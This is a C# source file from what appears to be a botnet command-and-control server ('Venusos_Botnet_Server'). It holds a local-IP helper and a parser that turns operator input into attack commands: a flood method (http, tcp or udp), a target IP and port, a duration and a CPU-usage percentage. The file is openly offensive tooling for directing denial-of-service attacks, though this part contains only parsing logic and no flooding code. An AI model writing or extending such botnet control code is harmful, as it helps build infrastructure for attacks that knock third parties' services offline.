using System.Net;
using System.Net.Sockets;

namespace Venusos_Botnet_Server
{
    public class Tools
    {
        public static IPAddress GetLocalIP()
        {
            string localIP;
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();
            }
            return IPAddress.Parse(localIP);
        }
        public static Command CreateCommand(string data)
        {
            string[] options = data.Split(" ");
            string error = "Errors:\n\r";

            if (options.Length < 6)
            {
                throw new Exception("Not enough arguments\n\r");
            }
            else if (options.Length > 6)
            {
                throw new Exception("Too many arguments\n\r");
            }

            Command command = new Command();

            if (!new List<string> { "http", "tcp", "udp" }.Contains(options[1]))
            {
                error += "unknown method\n\r";
            }
            else
            {
                command.Method = options[1];
            }

            try
            {
                command.IP = IPAddress.Parse(options[2]);
            }
            catch
            {
                error += "wrong ip address\n\r";
            }

            try
            {
                command.Port = (Convert.ToInt32(options[3]) is > 0) ? Convert.ToInt32(options[3]) : throw new Exception();
            }
            catch
            {
                error += "wrong port\n\r";
            }

            try
            {
                command.Duration = (Convert.ToInt32(options[4]) is >= 0) ? Convert.ToInt32(options[4]) : throw new Exception();
            }
            catch
            {
                error += "wrong duration\n\r";
            }

            try
            {
                command.CpuUsage = (Convert.ToInt32(options[5]) is > 0 and <= 100) ? Convert.ToInt32(options[5]) : throw new Exception();
            }
            catch
            {
                error += "wrong cpu usage percentage\n\r";
            }

            if (error == "Errors:\n\r")
            {
                return command;
            }
            else
            {
                throw new Exception(error);
            }
        }
    }
}
